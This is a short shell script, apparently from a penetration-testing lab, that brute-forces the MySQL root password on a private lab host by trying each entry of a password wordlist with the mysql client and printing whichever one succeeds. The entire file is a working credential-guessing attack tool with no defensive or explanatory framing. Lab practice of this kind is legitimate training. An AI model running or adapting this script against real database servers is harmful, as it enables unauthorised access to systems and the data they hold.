#!/bin/sh
RHOST="10.11.1.11" #rhost
USER="root" #username
PASS="/home/kali/Desktop/VHL/HelpDesk/txt/pass_pma.txt" #password file

function mysql_brute(){
   clear
   echo -e '\E[31;37m' "Attacking host $RHOST with password list $PASS against user $USER";tput sgr0
   a=1
      for i in `cat $PASS`
         do
            force=$(mysql -h $RHOST -u $USER -p"$i" -e "show databases;" 2> /dev/stdout)
            if [ "$?" == "0" ] #states if last password was true
               then
                  echo -e '\E[31;32m' "\r[*] Your Password sire";tput sgr0
                  echo -e '\E[31;31m' "$i\n"; tput sgr0
                  break
            else
                  echo -ne "\r[+] Is this it? $i\r\r"
            fi
   a=$(($a+1))
done
   echo -ne '\E[31;33m' "We done did finished... hopefully your password is in red right above this. Also if you are color blind sorry..."
}

mysql_brute
